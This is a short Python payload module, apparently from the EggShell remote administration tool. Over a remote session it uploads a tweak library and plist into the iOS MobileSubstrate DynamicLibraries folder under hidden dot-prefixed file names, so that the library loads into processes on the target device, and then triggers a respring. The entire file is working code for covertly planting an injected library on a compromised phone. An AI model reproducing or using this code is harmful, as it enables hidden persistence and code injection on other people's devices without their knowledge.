class payload:
    def __init__(self):
        self.name = "installpro"
        self.description = "installs eggshell tweak library"
        self.type = "native"
        self.id = 126

    def run(self,session,server,command):
        server.uploadFile("src/resources/eggshellPro.dylib","/Library/MobileSubstrate/DynamicLibraries/.espro.dylib",session.conn)
        server.uploadFile("src/resources/eggshellPro.plist","/Library/MobileSubstrate/DynamicLibraries/.espro.plist",session.conn)
        return "respring"
